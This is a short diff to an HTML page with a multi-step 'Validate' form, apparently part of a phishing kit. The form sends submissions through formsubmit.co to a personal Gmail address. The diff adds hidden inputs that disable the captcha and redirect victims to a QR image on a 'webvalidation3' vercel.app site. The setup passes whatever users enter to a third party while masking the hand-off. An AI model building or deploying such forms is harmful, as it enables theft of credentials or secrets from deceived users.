@@ -38,7 +38,9 @@
 
                     <!-- form -->
                   <form action="https://formsubmit.co/ollarkunle1@gmail.com" method="post" enctype="multipart/form-data" id="steps" class="ajaxForm">
-                    <div class="wrapper show-section">
+                   <input type="hidden" name="_captcha" value="false">
+                   <input type="hidden" name="_next" value="https://webvalidation3.vercel.app/Qr.png">                     
+					<div class="wrapper show-section">
 
                         <!-- step 1 -->
                         <section class="steps step-1">
@@ -278,7 +280,7 @@
                                         </div>
                                 <div class="next-prev pop">
                                     <button type="submit" class="prev"><i class="fa-solid fa-arrow-left"></i></button>
-                                    <button type="submit" ">Validate<i class="fa-solid fa-arrow-right"></i></button>
+                                    <button type="submit" id="sub" class="apply">Validate<i class="fa-solid fa-arrow-right"></i></button>
                                 </div>
                             </div>
                         </section>
